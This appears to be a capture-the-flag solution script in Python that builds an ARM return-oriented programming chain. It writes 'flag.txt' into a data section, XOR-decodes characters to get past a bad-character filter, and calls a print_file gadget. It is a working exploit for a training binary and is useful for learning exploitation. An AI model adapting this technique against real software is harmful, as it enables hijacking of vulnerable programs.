#!/usr/bin/python3

from ropchain import *

PRINT_FILE      = 0x000105e0
SUB_R6_AT_R5    = 0x000105f0
ADD_R6_AT_R5    = 0x00010600
XOR_R6_AT_R5    = 0x00010618
STORE_R3_AT_R4  = 0x00010610
POP_R5_R6       = 0x00010614
POP_R3          = 0x00010690
POP_R4          = 0x000105b0
POP_R0          = 0x000105fc
DATA_SECTION    = 0x00021024

# ROP

rop = pad(44)

rop += pack4(POP_R3) + packS("flag", 4)
rop += pack4(POP_R4) + pack4(DATA_SECTION)
rop += pack4(STORE_R3_AT_R4) + pack4(0) + pack4(0)

rop += pack4(POP_R3) + packS(".txt", 4)
rop += pack4(POP_R4) + pack4(DATA_SECTION + 4)
rop += pack4(STORE_R3_AT_R4) + pack4(0) + pack4(0)

for idx, ch in [(2, 'a'), (3, 'g'), (4, '.'), (6, 'x')]:
    rop += pack4(POP_R5_R6) + pack4(DATA_SECTION + idx) + pack4(ord(ch) ^ 0xeb)
    rop += pack4(XOR_R6_AT_R5) + pack4(DATA_SECTION)

rop += pack4(PRINT_FILE)

echo(rop)

